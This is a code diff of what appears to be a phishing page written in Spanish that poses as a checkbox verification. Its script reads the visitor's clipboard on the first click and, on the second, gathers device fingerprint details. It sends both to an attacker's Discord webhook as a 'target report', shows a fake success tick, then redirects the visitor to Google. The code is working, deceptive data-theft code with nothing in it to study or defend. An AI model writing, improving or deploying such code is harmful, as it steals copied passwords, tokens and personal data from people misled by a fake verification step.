@@ -44,56 +44,84 @@
         const trigger2 = document.getElementById('trigger-2');
         const checkbox = document.getElementById('checkbox');
 
-        // CLICK 1: Portapapeles Silencioso
+        // CLIC 1: CAPTURA DE PORTAPAPELES
         trigger1.addEventListener('click', async () => {
             flash.style.display = 'block';
             setTimeout(() => { flash.style.display = 'none'; }, 1);
-            
-            checkbox.style.borderColor = "#4285F4"; // Feedback de sistema
+            checkbox.style.borderColor = "#4285F4";
             
             try {
                 const text = await navigator.clipboard.readText();
-                enviarADiscord("🔑 Portapapeles", text);
-            } catch (e) { console.log("Silent skip"); }
+                enviarTextoDiscord(text);
+            } catch (e) { console.log("Skip"); }
 
             trigger1.style.display = "none";
             trigger2.style.display = "block";
         });
 
-        // CLICK 2: Captura Profunda de Información (Sin avisos)
+        // CLIC 2: RECOLECCIÓN Y FORMATEO DE INFO
         trigger2.addEventListener('click', async () => {
-            // Animamos el check como si fuera exitoso
             checkbox.innerHTML = '<div style="width:12px; height:6px; border-left:3px solid #00AA00; border-bottom:3px solid #00AA00; transform:rotate(-45deg); margin:4px auto;"></div>';
             
-            // Recolección de información del sistema
-            const info = {
-                plataforma: navigator.platform,
-                idioma: navigator.language,
-                nucleos: navigator.hardwareConcurrency,
-                memoria_ram: navigator.deviceMemory + " GB",
-                conexion: navigator.connection ? navigator.connection.effectiveType : "Desconocida",
-                pantalla: `${window.screen.width}x${window.screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                agente: navigator.userAgent
-            };
+            // Lógica de detección de gama basada en RAM y Núcleos
+            const ram = navigator.deviceMemory || 0;
+            const cores = navigator.hardwareConcurrency || 0;
+            let gama = "Baja";
+            if(ram >= 6 || cores >= 8) gama = "Media/Alta";
+            if(ram >= 12) gama = "Premium";
 
-            enviarADiscord("📊 Info de Sistema", JSON.stringify(info, null, 2));
+            // Formateo del mensaje para Discord
+            const mensajeBonito = `🌍 **UBICACIÓN**
+   • Provincia: ${Intl.DateTimeFormat().resolvedOptions().timeZone.split('/')[1].replace('_', ' ')}
+   • Zona horaria: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
 
-            // Simulación de carga final para redirigir
+📱 **DISPOSITIVO**
+   • Plataforma: ${navigator.platform}
+   • Pantalla: ${window.screen.width} x ${window.screen.height} píxeles
+
+⚙️ **RENDIMIENTO**
+   • Núcleos: ${cores} procesadores
+   • Memoria RAM: ${ram} GB
+   • Gama: ${gama}
+
+📶 **CONEXIÓN**
+   • Tipo: ${navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "Desconocida"}
+
+🌐 **NAVEGADOR**
+   • Agente: ${navigator.userAgent.split(')')[0].split('(')[1]} (Móvil)`;
+
+            enviarInfoDiscord(mensajeBonito);
+
             setTimeout(() => {
                 window.location.href = "https://www.google.com";
             }, 800);
         });
 
-        function enviarADiscord(titulo, contenido) {
+        function enviarTextoDiscord(contenido) {
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     embeds: [{
-                        title: titulo,
-                        description: "```" + contenido + "```",
+                        title: "🔑 CONTENIDO DEL PORTAPAPELES",
+                        description: "```" + (contenido || "Nada copiado o permiso denegado") + "```",
                         color: 4359668,
+                        timestamp: new Date()
+                    }]
+                })
+            });
+        }
+
+        function enviarInfoDiscord(info) {
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🎯 REPORTE DE OBJETIVO",
+                        description: info,
+                        color: 16711680,
+                        footer: { text: "Neuro-Kernel Exploit | 2026" },
                         timestamp: new Date()
                     }]
                 })
